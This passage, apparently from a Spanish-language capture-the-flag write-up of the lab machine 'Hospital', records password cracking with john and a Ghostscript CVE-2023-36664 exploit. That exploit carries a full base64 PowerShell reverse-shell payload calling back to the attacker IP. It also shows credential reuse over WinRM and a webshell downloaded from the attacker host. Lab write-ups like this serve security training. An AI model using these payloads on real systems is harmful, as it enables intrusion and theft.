</span></span></span><span class=line><span class=cl><span class=go>syslog:!:19462::::::
</span></span></span><span class=line><span class=cl><span class=go>uuidd:!:19462::::::
</span></span></span><span class=line><span class=cl><span class=go>tcpdump:!:19462::::::
</span></span></span><span class=line><span class=cl><span class=go>tss:!:19462::::::
</span></span></span><span class=line><span class=cl><span class=go>landscape:!:19462::::::
</span></span></span><span class=line><span class=cl><span class=go>fwupd-refresh:!:19462::::::
</span></span></span><span class=line><span class=cl><span class=go>drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
</span></span></span><span class=line><span class=cl><span class=go>lxd:!:19612::::::
</span></span></span><span class=line><span class=cl><span class=go>mysql:!:19620::::::
</span></span></span></code></pre></div><p>Además del hash del usuario <code>root</code>, puedo ver un hash para un usuario llamado <code>drwilliams</code></p><ul><li>Guardo este hash en un archivo y en mi equipo lo trato de crackerlo utilizando <code>john</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>john --wordlist=/usr/share/wordlists/rockyou.txt drwilliams_hash.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default input encoding: UTF-8
</span></span></span><span class=line><span class=cl><span class=go>Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
</span></span></span><span class=line><span class=cl><span class=go>Cost 1 (iteration count) is 5000 for all loaded hashes
</span></span></span><span class=line><span class=cl><span class=go>Will run 5 OpenMP threads
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span></span><span class=line><span class=cl><span class=go>qwe123!@#        (drwilliams)
</span></span></span><span class=line><span class=cl><span class=go>1g 0:00:00:31 DONE (2024-01-05 20:38) 0.03125g/s 6702p/s 6702c/s 6702C/s rissie..popsickle
</span></span></span><span class=line><span class=cl><span class=go>Use the &#34;--show&#34; option to display all of the cracked passwords reliably
</span></span></span><span class=line><span class=cl><span class=go>Session completed.
</span></span></span></code></pre></div><p>de manera que tenemos una credencial: <code>drwilliams:qwe123!@#</code></p><ul><li>Podemos entonces volver al sitio <code>HTTPs</code> en el puerto <code>443</code> (no el que corría en el puerto <code>8080</code>) y tratar de loguear con esta nueva credencial. Y funciona:
<img alt="Login on portal HTTPs" src=/pentesting/images/Hospital_8.png></li><li>En <code>Mail -> Inbox</code> puedo ver un mail titulado <code>Needle designs for Darius Simion.</code> Cuando lo abro dice:
<img alt="Leaked mail" src=/pentesting/images/Hospital_9.png>
De manera que este sitio es algo así como un administrador/manager de correos el cual podría usar archivos <code>.eps</code> dado que está corriendo con <code>GhostScript</code>. Podemos crear archivos maliciosos <code>.eps</code> que ejecuten scripts/comanso <a href=https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git class=external-link target=_blank rel=noopener>usando este repositorio</a> basado en la vulnerabilidad catalogada como <code>CVE-2023-36664</code>.</li><li>Generamos un payload de <code>Powershell</code> usando el sitio web <a href=https://www.revshells.com/ class=external-link target=_blank rel=noopener>https://www.revshells.com/</a>. Más específicamente, una payload de tipo <code>PowerShell #3 (Base64)</code> con mi IP de atacante <code>10.10.16.6</code> y el puerto <code>443</code>. Luego, agregamos el payload al archivo <code>file.eps</code>, el cual viene incluido en el repositorio mencionado y corremos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>python3 CVE_2023_36664_exploit.py --inject --filename file.eps --payload &#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Payload successfully injected into file.eps.
</span></span></span></code></pre></div><ul><li>Ahora creamos un nuevo email, se lo enviamos a &ldquo;Dr. Brown&rdquo; y adjuntamos el archivo <code>file.eps</code>. Para esto, vamos a <code>Contacts -> Collected Recipients -> Click on Drbrown -> Click on 'drbrown@hospital.htb'</code>.</li></ul><p><img alt="Sending malicious mail" src=/pentesting/images/Hospital_10.png>
Recordar que antes de mandar el email debemos empezar un listener con <code>nc</code> en el puerto <code>443</code> (o, en su caso, el puerto que hayan usado al generar el payload de <code>Powershell</code> en <a href=https://www.revshells.com/ class=external-link target=_blank rel=noopener>https://www.revshells.com/</a>) usando también <code>rlwrap</code>. Deberíamos de obtener una reverse shell una vez enviado el correo.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>rlwrap nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.241] 6317
</span></span></span><span class=line><span class=cl><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>hospital\drbrown
</span></span></span><span class=line><span class=cl><span class=go>PS C:\Users\drbrown.HOSPITAL\Documents&gt;
</span></span></span></code></pre></div><ul><li>Noto que el directorio <code>C:\Users</code> tiene 2 directorios para cada Doctor:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Users\drbrown.HOSPITAL\Documents&gt; dir C:\users
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Directory: C:\users
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mode                LastWriteTime         Length Name
</span></span></span><span class=line><span class=cl><span class=go>----                -------------         ------ ----
</span></span></span><span class=line><span class=cl><span class=go>d-----         9/6/2023   2:08 AM                .NET v4.5
</span></span></span><span class=line><span class=cl><span class=go>d-----         9/6/2023   2:08 AM                .NET v4.5 Classic
</span></span></span><span class=line><span class=cl><span class=go>d-----       11/13/2023   9:05 PM                Administrator
</span></span></span><span class=line><span class=cl><span class=go>d-----         9/6/2023   1:49 AM                drbrown
</span></span></span><span class=line><span class=cl><span class=go>d-----       11/13/2023   9:40 PM                drbrown.HOSPITAL
</span></span></span><span class=line><span class=cl><span class=go>d-----         9/6/2023   1:49 AM                drwilliams
</span></span></span><span class=line><span class=cl><span class=go>d-----         9/6/2023   7:55 AM                drwilliams.HOSPITAL
</span></span></span><span class=line><span class=cl><span class=go>d-r---         9/5/2023   9:24 AM                Public
</span></span></span></code></pre></div><ul><li>Buscamos el archivo <code>user.txt</code> usando <code>Powershell</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Users\drbrown.HOSPITAL\Documents&gt; Get-ChildItem -Path C:\ -Recurse -Filter &#34;user.txt&#34; -ErrorAction SilentlyContinue
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Directory: C:\Users\drbrown.HOSPITAL\Desktop
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mode                LastWriteTime         Length Name
</span></span></span><span class=line><span class=cl><span class=go>----                -------------         ------ ----
</span></span></span><span class=line><span class=cl><span class=go>-ar---         1/5/2024   9:57 PM             34 user.txt
</span></span></span></code></pre></div><p>y la flag está en el Desktop de <code>drbrown.HOSPITAL</code>, donde ya podemos leerla.</p><h2 id=nt-authoritysystem---administrator>NT Authority/System - Administrator
<a class=heading-link href=#nt-authoritysystem---administrator><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Cuando logueamos como el usuario <code>drbrown</code>, estamos ubicados en el directorio <code>C:\Users\drbrown.HOSPITAL\Documents</code>. Podemos ver un archivo llamado <code>ghostscript.bat</code>.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Users\drbrown.HOSPITAL\Documents&gt; dir
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Directory: C:\Users\drbrown.HOSPITAL\Documents
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mode                LastWriteTime         Length Name
</span></span></span><span class=line><span class=cl><span class=go>----                -------------         ------ ----
</span></span></span><span class=line><span class=cl><span class=go>-a----       10/23/2023   3:33 PM            373 ghostscript.bat
</span></span></span></code></pre></div><ul><li>Cuyo contenido es:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>PS C:\Users\drbrown.HOSPITAL\Documents&gt; type ghostscript.bat
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>@echo off
</span></span></span><span class=line><span class=cl><span class=go>set filename=%~1
</span></span></span><span class=line><span class=cl><span class=go>powershell -command &#34;$p = convertto-securestring &#39;chr!$br0wn&#39; -asplain -force;$c = new-object system.management.automation.pscredential(&#39;hospital\drbrown&#39;, $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c &#34;C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe&#34; -dNOSAFER &#34;C:\Users\drbrown.HOSPITAL\Downloads\%filename%&#34; }&#34;
</span></span></span></code></pre></div><p>de manera que encontramos nuevas credenciales: <code>drbrown:chr!$br0wn</code></p><ul><li>Dado que el servicio <code>Windows Remote Management</code> was also available según el scan de <code>Nmap</code>, podemos utilizar <code>NetExec</code> (el sucesor de <code>CrackMapExec</code>) para chequear si podemos loguearnos con esta credencial, y&mldr;</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ netexec winrm 10.10.11.241 -u &#39;drbrown&#39; -p &#39;chr!$br0wn&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WINRM       10.10.11.241    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:hospital.htb)
</span></span></span><span class=line><span class=cl><span class=go>WINRM       10.10.11.241    5985   DC               [+] hospital.htb\drbrown:chr!$br0wn (Pwn3d!)
</span></span></span></code></pre></div><p>podemos.</p><ul><li>De manera que nos logueamos usando <code>evil-winrm</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ evil-winrm -i 10.10.11.241 -u &#39;drbrown&#39; -p &#39;chr!$br0wn&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Evil-WinRM shell v3.5
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Establishing connection to remote endpoint
</span></span></span><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents&gt;
</span></span></span></code></pre></div><ul><li>Devuelta al scan con <code>Nmap</code>, recuerdo también que el servicio <code>Microsoft RPC</code> se encontraba corriendo en esta máquina. Usando <code>rpcclient</code> como el usuario <code>drbrown</code> y la contraseña hallada nos lleva a una info interesante:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ rpcclient -U &#34;drbrown&#34; 10.10.11.241
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Password for [WORKGROUP\drbrown]:
</span></span></span><span class=line><span class=cl><span class=go>rpcclient $&gt; querydispinfo
</span></span></span><span class=line><span class=cl><span class=go>index: 0x2054 RID: 0x464 acb: 0x00020015 Account: $431000-R1KSAI1DGHMH  Name: (null)    Desc: (null)
</span></span></span><span class=line><span class=cl><span class=go>index: 0xeda RID: 0x1f4 acb: 0x00004210 Account: Administrator  Name: Administrator     Desc: Built-in account for administering the computer/domain
</span></span></span><span class=line><span class=cl><span class=go>index: 0x2271 RID: 0x641 acb: 0x00000210 Account: drbrown       Name: Chris Brown       Desc: (null)
</span></span></span><span class=line><span class=cl><span class=go>index: 0x2272 RID: 0x642 acb: 0x00000210 Account: drwilliams    Name: Lucy Williams     Desc: (null)
</span></span></span><span class=line><span class=cl><span class=go>index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
</span></span></span><span class=line><span class=cl><span class=go>index: 0xf0f RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
</span></span></span><span class=line><span class=cl><span class=go>index: 0x2073 RID: 0x465 acb: 0x00020011 Account: SM_0559ce7ac4be4fc6a  Name: Microsoft Exchange Approval Assistant     Desc: (null)
</span></span></span><span class=line><span class=cl><span class=go>index: 0x207e RID: 0x46d acb: 0x00020011 Account: SM_2fe3f3cbbafa4566a  Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}       Desc: (null)
</span></span></span><span class=line><span class=cl><span class=go>index: 0x207a RID: 0x46c acb: 0x00020011 Account: SM_5faa2be1160c4ead8  Name: Microsoft Exchange        Desc: (null)
</span></span></span><span class=line><span class=cl><span class=go>index: 0x2079 RID: 0x46b acb: 0x00020011 Account: SM_6e9de17029164abdb  Name: E4E Encryption Store - Active     Desc: (null)
</span></span></span><span class=line><span class=cl><span class=go>index: 0x2078 RID: 0x46a acb: 0x00020011 Account: SM_75554ef7137f41d68  Name: Microsoft Exchange Federation Mailbox     Desc: (null)
</span></span></span><span class=line><span class=cl><span class=go>index: 0x2075 RID: 0x467 acb: 0x00020011 Account: SM_9326b57ae8ea44309  Name: Microsoft Exchange        Desc: (null)
</span></span></span><span class=line><span class=cl><span class=go>index: 0x2076 RID: 0x468 acb: 0x00020011 Account: SM_b1b9e7f83082488ea  Name: Discovery Search Mailbox  Desc: (null)
</span></span></span><span class=line><span class=cl><span class=go>index: 0x2074 RID: 0x466 acb: 0x00020011 Account: SM_bb030ff39b6c4a2db  Name: Microsoft Exchange        Desc: (null)
</span></span></span><span class=line><span class=cl><span class=go>index: 0x2077 RID: 0x469 acb: 0x00020011 Account: SM_e5b6f3aed4da4ac98  Name: Microsoft Exchange Migration      Desc: (null)
</span></span></span></code></pre></div><p>esto es mucha data, pero si vemos los usuarios <code>Guest</code> y <code>Administrator</code> podemos notar algo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ rpcclient -U &#39;drbrown%chr!$br0wn&#39; 10.10.11.241 -c &#39;querydispinfo&#39; | grep -E &#39;Guest|Administrator&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>index: 0xeda RID: 0x1f4 acb: 0x00004210 Account: Administrator  Name: Administrator     Desc: Built-in account for administering the computer/domain
</span></span></span><span class=line><span class=cl><span class=go>index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>❯ rpcclient -U &#39;drbrown%chr!$br0wn&#39; 10.10.11.241 -c &#39;queryuser 0x1f5&#39;
</span></span></span><span class=line><span class=cl><span class=go>        User Name   :   Guest
</span></span></span><span class=line><span class=cl><span class=go>        Full Name   :
</span></span></span><span class=line><span class=cl><span class=go>        Home Drive  :
</span></span></span><span class=line><span class=cl><span class=go>        Dir Drive   :
</span></span></span><span class=line><span class=cl><span class=go>        Profile Path:
</span></span></span><span class=line><span class=cl><span class=go>        Logon Script:
</span></span></span><span class=line><span class=cl><span class=go>        Description :   Built-in account for guest access to the computer/domain
</span></span></span><span class=line><span class=cl><span class=go>        Workstations:
</span></span></span><span class=line><span class=cl><span class=go>        Comment     :
</span></span></span><span class=line><span class=cl><span class=go>        Remote Dial :
</span></span></span><span class=line><span class=cl><span class=go>        Logon Time               :      Wed, 31 Dec 1969 21:00:00 -03
</span></span></span><span class=line><span class=cl><span class=go>        Logoff Time              :      Wed, 31 Dec 1969 21:00:00 -03
</span></span></span><span class=line><span class=cl><span class=go>        Kickoff Time             :      Wed, 13 Sep 30828 23:48:05 -03
</span></span></span><span class=line><span class=cl><span class=go>        Password last set Time   :      Wed, 31 Dec 1969 21:00:00 -03
</span></span></span><span class=line><span class=cl><span class=go>        Password can change Time :      Wed, 31 Dec 1969 21:00:00 -03
</span></span></span><span class=line><span class=cl><span class=go>        Password must change Time:      Wed, 13 Sep 30828 23:48:05 -03
</span></span></span><span class=line><span class=cl><span class=go>        unknown_2[0..31]...
</span></span></span><span class=line><span class=cl><span class=go>        user_rid :      0x1f5
</span></span></span><span class=line><span class=cl><span class=go>        group_rid:      0x202
</span></span></span><span class=line><span class=cl><span class=go>        acb_info :      0x00000215
</span></span></span><span class=line><span class=cl><span class=go>        fields_present: 0x00ffffff
</span></span></span><span class=line><span class=cl><span class=go>        logon_divs:     168
</span></span></span><span class=line><span class=cl><span class=go>        bad_password_count:     0x00000000
</span></span></span><span class=line><span class=cl><span class=go>        logon_count:    0x00000000
</span></span></span><span class=line><span class=cl><span class=go>        padding1[0..7]...
</span></span></span><span class=line><span class=cl><span class=go>        logon_hrs[0..21]...
</span></span></span><span class=line><span class=cl><span class=go>❯ rpcclient -U &#39;drbrown%chr!$br0wn&#39; 10.10.11.241 -c &#39;queryuser 0x1f4&#39;
</span></span></span><span class=line><span class=cl><span class=go>        User Name   :   Administrator
</span></span></span><span class=line><span class=cl><span class=go>        Full Name   :   Administrator
</span></span></span><span class=line><span class=cl><span class=go>        Home Drive  :
</span></span></span><span class=line><span class=cl><span class=go>        Dir Drive   :
</span></span></span><span class=line><span class=cl><span class=go>        Profile Path:
</span></span></span><span class=line><span class=cl><span class=go>        Logon Script:
</span></span></span><span class=line><span class=cl><span class=go>        Description :   Built-in account for administering the computer/domain
</span></span></span><span class=line><span class=cl><span class=go>        Workstations:
</span></span></span><span class=line><span class=cl><span class=go>        Comment     :
</span></span></span><span class=line><span class=cl><span class=go>        Remote Dial :
</span></span></span><span class=line><span class=cl><span class=go>        Logon Time               :      Sat, 13 Apr 2024 08:02:00 -04
</span></span></span><span class=line><span class=cl><span class=go>        Logoff Time              :      Wed, 31 Dec 1969 21:00:00 -03
</span></span></span><span class=line><span class=cl><span class=go>        Kickoff Time             :      Wed, 13 Sep 30828 23:48:05 -03
</span></span></span><span class=line><span class=cl><span class=go>        Password last set Time   :      Tue, 12 Sep 2023 04:58:45 -03
</span></span></span><span class=line><span class=cl><span class=go>        Password can change Time :      Tue, 12 Sep 2023 04:58:45 -03
</span></span></span><span class=line><span class=cl><span class=go>        Password must change Time:      Wed, 13 Sep 30828 23:48:05 -03
</span></span></span><span class=line><span class=cl><span class=go>        unknown_2[0..31]...
</span></span></span><span class=line><span class=cl><span class=go>        user_rid :      0x1f4
</span></span></span><span class=line><span class=cl><span class=go>        group_rid:      0x201
</span></span></span><span class=line><span class=cl><span class=go>        acb_info :      0x00004210
</span></span></span><span class=line><span class=cl><span class=go>        fields_present: 0x00ffffff
</span></span></span><span class=line><span class=cl><span class=go>        logon_divs:     168
</span></span></span><span class=line><span class=cl><span class=go>        bad_password_count:     0x00000000
</span></span></span><span class=line><span class=cl><span class=go>        logon_count:    0x00000137
</span></span></span><span class=line><span class=cl><span class=go>        padding1[0..7]...
</span></span></span><span class=line><span class=cl><span class=go>        logon_hrs[0..21]...
</span></span></span></code></pre></div><p>que es que los usuarios <code>Guest</code> y <code>Administrator</code> comparten información.</p><ul><li>Podemos entonces chequear los permisos que tendríamos su subiéramos una webshell (la misma que <code>pwnshell.php</code> que habíamos utilizado anteriormente), pero esta vez en servicio <code>HTTPs</code> (el que corre en el puerto <code>443</code>). Primero decido investigar el directorio <code>inetpub</code> localizado en <code>C:\</code>. Pero no veo nada interesante más allá de un archivo backup que no muestra info valiosa. Pero en el directorio <code>C:\xampp\htdocs</code> (donde, aparentemente, está corriendo el servicio) testeo creando un simple archivo <code>PHP</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\&gt; echo &#39;&lt;?php echo &#34;this is a test&#34;; ?&gt;&#39; &gt; C:\xampp\htdocs\testing.php
</span></span></span></code></pre></div><ul><li>Cuando visito <code>https://10.10.11.241/testing.php</code> la página no muestra directamente el contenido de <code>testing.php</code>, no obstante el recurso sí existe. De manera que estamos creando y exponiendo un archivo.</li><li>Decido empezar un server temporal de <code>Python</code> <code>HTTP</code> en el puerto <code>8080</code> para transferir archivos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ ls &amp;&amp; python3 -m http.server 8080
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>CVE-2023-36664-Ghostscript-command-injection  pwnshell.phar  pwnshell.php
</span></span></span></code></pre></div><p>y luego, en la máquina víctima, lo descargo utilizando <code>wget</code> desde la sesión <code>evil-winrm</code> y llamar a este archivo <code>gunzf0x.php</code> (luego me acordé de que <code>evil-winrm</code> tiene el comando <code>upload</code> que también nos sirve, pero bueno, me quise complicar la vida):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\&gt; wget http://10.10.16.6:8080/pwnshell.php -O C:\xampp\htdocs\gunzf0x.php
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>*Evil-WinRM* PS C:\&gt; dir C:\xampp\htdocs\
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Directory: C:\xampp\htdocs
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mode                LastWriteTime         Length Name
</span></span></span><span class=line><span class=cl><span class=go>----                -------------         ------ ----
</span></span></span><span class=line><span class=cl><span class=go>d-----       10/22/2023  10:19 PM                bin
</span></span></span><span class=line><span class=cl><span class=go>d-----       10/22/2023  11:47 PM                config
</span></span></span><span class=line><span class=cl><span class=go>d-----       10/22/2023  10:33 PM                default
</span></span></span><span class=line><span class=cl><span class=go>d-----       10/22/2023  10:19 PM                installer
</span></span></span><span class=line><span class=cl><span class=go>d-----       10/22/2023  10:32 PM                logs
</span></span></span><span class=line><span class=cl><span class=go>d-----       10/22/2023  10:19 PM                plugins
</span></span></span><span class=line><span class=cl><span class=go>d-----       10/22/2023  10:20 PM                program
</span></span></span><span class=line><span class=cl><span class=go>d-----       10/22/2023  10:20 PM                skins
</span></span></span><span class=line><span class=cl><span class=go>d-----       10/22/2023  10:19 PM                SQL
</span></span></span><span class=line><span class=cl><span class=go>d-----        4/13/2024   6:00 AM                temp
</span></span></span><span class=line><span class=cl><span class=go>d-----       10/22/2023  10:20 PM                vendor
</span></span></span><span class=line><span class=cl><span class=go>-a----       10/16/2023  12:23 PM           2553 .htaccess
</span></span></span><span class=line><span class=cl><span class=go>-a----       10/16/2023  12:23 PM         211743 CHANGELOG.md
</span></span></span><span class=line><span class=cl><span class=go>-a----       10/16/2023  12:23 PM            994 composer.json
</span></span></span><span class=line><span class=cl><span class=go>-a----       10/16/2023  12:23 PM           1086 composer.json-dist
</span></span></span><span class=line><span class=cl><span class=go>-a----       10/16/2023  12:23 PM          56279 composer.lock
</span></span></span><span class=line><span class=cl><span class=go>-a----        4/13/2024   6:56 AM          20321 gunzf0x.php
</span></span></span><span class=line><span class=cl><span class=go>-a----       10/16/2023  12:23 PM          11199 index.php
</span></span></span><span class=line><span class=cl><span class=go>-a----       10/16/2023  12:23 PM          12661 INSTALL
</span></span></span><span class=line><span class=cl><span class=go>-a----       10/16/2023  12:23 PM          35147 LICENSE
</span></span></span><span class=line><span class=cl><span class=go>-a----       10/16/2023  12:23 PM           3853 README.md
</span></span></span><span class=line><span class=cl><span class=go>-a----       10/16/2023  12:23 PM            967 SECURITY.md
</span></span></span><span class=line><span class=cl><span class=go>-a----        4/13/2024   6:54 AM             68 testing.php
</span></span></span><span class=line><span class=cl><span class=go>-a----       10/16/2023  12:23 PM           4657 UPGRADING
</span></span></span></code></pre></div><ul><li>Una vez subida, visitamos el sitio <code>https://10.10.11.241/gunzf0x.php</code> y ahora somos <code>NT Authority/System</code> en nuestra webshell&mldr; lo que no es muy realista, pero bueno.
<img alt="Webshell on HTTPs" src=/pentesting/images/Hospital_11.png>
De manera que podemos obtener la flag en el Desktop de <code>Administrator</code> y máquina completada.</li></ul></div><footer></footer></article></section></div><footer class=footer><section class=container>©
2023 -
2024
gunzf0x
·
Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>